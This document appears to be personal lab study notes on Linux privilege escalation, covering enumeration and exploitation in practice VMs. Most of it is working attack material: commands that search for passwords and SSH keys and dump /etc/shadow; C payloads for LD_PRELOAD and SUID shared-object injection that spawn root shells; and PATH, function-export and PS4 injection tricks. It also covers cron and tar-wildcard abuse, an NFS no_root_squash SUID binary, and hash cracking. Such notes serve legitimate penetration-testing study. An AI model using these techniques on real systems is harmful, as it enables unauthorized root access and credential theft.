

https://github.com/swisskyrepo/PayloadsAllTheThings

https://book.hacktricks.wiki/en/index.html

https://sushant747.gitbooks.io/total-oscp-guide/content/

cat /proc/version :Show Linux kernel version and build info.
lscpu : Show detailed CPU architecture info.
cat /etc/issues: **system identification message** displayed **before login**
ps  aux: List **all** running processes.

ps aux | root: Show only processes run by **user root**.

cat /etc/passwd | cut -d : -f 1   -> lists out all user , delimiter : , !st value 

cat /etc/groups
 ifconfig
ip route 
ip neigh :  stale or reachable

netstat -ano : display **active network connections**, along with process IDs and port info.

grep --color=auto -rnw '/' -ie "PASSWORD="  --color=always 2> /dev/null : searches the whole system (/) for files containing the text PASSWORD=, ignore cases, and highlight it

find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

find / -name id_rsa 2> /dev/null

### privilege escalation tools

https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS

https://github.com/rebootuser/LinEnum

https://github.com/The-Z-Labs/linux-exploit-suggester

https://github.com/sleventyeleven/linuxprivchecker

## kernel
![[kernel.png]]
https://github.com/lucyoa/kernel-exploits
- FInd the kernel version through unmae -a and search for any exploits.
- gcc -pthread c0w.c -o cow: This compiles `c0w.c` using GCC with thread support, and produces an executable named `cow`.

## SSH keys
**find / -name authorized_keys 2> /dev/null**  : authorizd keys contain public key.
find / -name id_rsa 2> /dev/null
copy and paste id_rsa \
chmod 400 id_rsa : read only for owner
chmod 600 id_rsa : read and write for owner
ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa -i id_rsa root@10.10.197.50


### Sudo 
| Command                    | Tool   | Why It Works                       |
| -------------------------- | ------ | ---------------------------------- |
| `find -exec /bin/sh`       | `find` | Uses `-exec` to spawn root shell   |
| `awk 'BEGIN {system(...)}` | `awk`  | Executes a root shell via `system` |
| `nmap --script=shell.nse`  | `nmap` | Lua script triggers root shell     |
| `vim -c '!sh'`             | `vim`  | Vim runs external root shell       |

----
## Privilege Escalation - Sudo (Abusing Intended Functionality)

**Detection**

Linux VM
1. In command prompt type: **sudo -l**
2. From the output, notice the list of programs that can run via sudo.

**Exploitation**

Linux VM

1. In command prompt type:
**sudo apache2 -f /etc/shadow**
2. From the output, copy the root hash.

Attacker VM
1. Open command prompt and type:

**echo '[Pasted Root Hash]' > hash.txt**

2. In command prompt type:

**john --wordlist=/usr/share/wordlists/nmap.lst hash.txt**

3. From the output, notice the cracked credentials.
---
### Privilege Escalation - Sudo (LD_PRELOAD)**Detection**

Linux VM
1. In command prompt type: **sudo -l**
2. From the output, notice that the **LD_PRELOAD** environment variable is intact.
**Exploitation**
3. Open a text editor and type:

**#include <stdio.h>**

**#include <sys/types.h>**

**#include <stdlib.h>**

**void _init() {**

    **unsetenv("LD_PRELOAD");**

    **setgid(0);**

    **setuid(0);**

    **system("/bin/bash");**

**}**
2. Save the file as x.c

3. In command prompt type:

**gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles** : -fPIC
|Generates **Position-Independent Code** (required for shared libraries)|

-nostratfiles :Don't use the standard system startup files (`crt1.o`, etc.)
4. In command prompt type:

**sudo LD_PRELOAD=/tmp/x.so apache2**

5. In command prompt type: **id**
---
## SUID shared Object injection

## 🔍 Detection Phase

### **1. Find SUID binaries**

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

- **What it does**: Finds all files with the SUID bit set (`04000`).
    
- **SUID binaries** run with the **file owner's privileges**, usually `root`, even when executed by another user.
    
- These can be potential privilege escalation vectors.
    

---

### **2. Identify custom or unusual SUID binaries**

Look for **non-standard** paths (like `/usr/local/bin/suid-so`), not system ones like `/usr/bin/passwd`.

These are **more likely misconfigured**, or created intentionally in CTF/lab environments.

---

### **3. Trace dynamic dependencies**

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

- **What it does**: Follows system calls (`open()`, `access()`) made by the binary.
    
- **Goal**: Check if it's trying to load a `.so` (shared object) library that doesn't exist.
    

📌 If it tries to open a file like:

```
/home/user/.config/libcalc.so => No such file
```

That’s your opportunity to **inject a malicious library** there.

---

## 💣 Exploitation Phase

### **4. Create missing folder (if not present)**

```bash
mkdir -p /home/user/.config
cd /home/user/.config
```

- Ensures the directory the SUID binary is trying to load from exists.
    

---

### **5. Create malicious shared object**

In a text editor (like `nano libcalc.c`), write this payload:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

#### 🔍 Why this works:

- `__attribute__((constructor))` runs **before main()**, **as soon as the `.so` is loaded**.
    
- It:
    
    - Copies `/bin/bash` to `/tmp/bash`
        
    - Sets the **SUID bit** with `chmod +s`
        
    - Launches a **root shell** (`/tmp/bash -p`)
        

---

### **6. Compile the shared object**

```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

- `-fPIC`: Position-independent code (needed for shared libraries)
    
- `-shared`: Create `.so` file
    

---

### **7. Trigger the exploit**

```bash
/usr/local/bin/suid-so
```

✅ This binary now **loads your malicious `.so`** from the writable path and executes the injected code.

---

### **8. Get root shell**

```bash
/tmp/bash -p
```

or just:

```bash
id
```

✅ You’ll see:

```
uid=0(root) gid=0(root) groups=0(root)
```

You now have a **root shell**.

---
## SUID (Symlinks)
Privilege Escalation - SUID (Symlinks)

**Detection**
Linux VM
1. In command prompt type: **dpkg -l | grep nginx**

2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.
**Exploitation**

Linux VM – Terminal 1

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: **su root**

2. The root password is **password123**

3. Once escalated to root, in command prompt type: **su -l www-data** : login as www-data ( typically used bby Nginx/Apache web services)

4. In command prompt type: **/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log**
     This command runs a **privilege escalation exploit** against **vulnerable versions of Nginx** by targeting its log file (`/var/log/nginx/error.log`).

5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

Linux VM – Terminal 2


1. Once logged in, type: **su root**

2. The root password is **password123**

3. As root, type the following: **invoke-rc.d nginx rotate >/dev/null 2>&1**

4. Switch back to the previous terminal.

  

Linux VM – Terminal 1

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: **id**
---
## SUID (Env Var)

Linux VM  

1. In command prompt type: **find / -type f -perm -04000 -ls 2>/dev/null**

2. From the output, make note of all the SUID binaries.

3. In command prompt type: **strings /usr/local/bin/suid-env**

4. From the output, notice the functions used by the binary.

**Exploitation**
Linux VM

1. In command prompt type:

**echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c**

2. In command prompt type: **gcc /tmp/service.c -o /tmp/service**

3. In command prompt type: **export PATH=/tmp:$PATH**

4. In command prompt type: **/usr/local/bin/suid-env**

5. In command prompt type: **id**

---
### SUID (Env var 2)
Linux VM

1. In command prompt type: **find / -type f -perm -04000 -ls 2>/dev/null**

2. From the output, make note of all the SUID binaries.

3. In command prompt type: strings **/usr/local/bin/suid-env2**

4. From the output, notice the functions used by the binary.


**Exploitation Method #1**

Linux VM

1. In command prompt type:

**function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }**

2. In command prompt type:

**export -f /usr/sbin/service**

3. In command prompt type: **/usr/local/bin/suid-env2**

**Exploitation Method #2**

Linux VM

1. In command prompt type:

**env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'**

---
## Capabilities
Linux VM

1. In command prompt type: getcap -r / 2>/dev/null
2. From the output, notice the value of the “cap_setuid” capability.

Exploitation

Linux VM

1. In command prompt type:
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
2. Enjoy root!
---
## CRON

1. In command prompt type: **cat /etc/crontab**

2. From the output, notice the value of the “PATH” variable.

**Exploitation**

Linux VM
1. In command prompt type:

**echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh**

2. In command prompt type: **chmod +x /home/user/overwrite.sh**

3. Wait 1 minute for the Bash script to execute.

4. In command prompt type: **/tmp/bash -p**

5. In command prompt type: **id**
---
## CRON (wildcards)

Linux VM

1. In command prompt type: **cat /etc/crontab**

2. From the output, notice the script “/usr/local/bin/compress.sh”

3. In command prompt type: **cat /usr/local/bin/compress.sh**

4. From the output, notice the wildcard (*) used by ‘tar’.

**Exploitation**

Linux VM

1. In command prompt type:

**echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh**

2. **touch /home/user/--checkpoint=1**

3. **touch /home/user/--checkpoint-action=exec=sh\ runme.sh**

4. Wait 1 minute for the Bash script to execute.

5. In command prompt type: **/tmp/bash -p**

6. In command prompt type: **id**
---
## CRON (file overwrite)

1. In command prompt type: **cat /etc/crontab**

2. From the output, notice the script “overwrite.sh”

3. In command prompt type: **ls -l /usr/local/bin/overwrite.sh**

4. From the output, notice the file permissions.

**Exploitation**

Linux VM

1. In command prompt type:

**echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh**

2. Wait 1 minute for the Bash script to execute.

3. In command prompt type: **/tmp/bash -p**

4. In command prompt type: **id**

---
### NFS Root squashing
linux VM

1. In command line type: cat /etc/exports
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

Exploitation

Attacker VM

1. Open command prompt and type: showmount -e 10.10.30.241
2. In command prompt type: mkdir /tmp/1
3. In command prompt type: mount -o rw,vers=2 10.10.30.241:/tmp /tmp/1
In command prompt type:
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
4. In command prompt type: gcc /tmp/1/x.c -o /tmp/1/x
5. In command prompt type: chmod +s /tmp/1/x

Linux VM

1. In command prompt type: /tmp/x
2. In command prompt type: id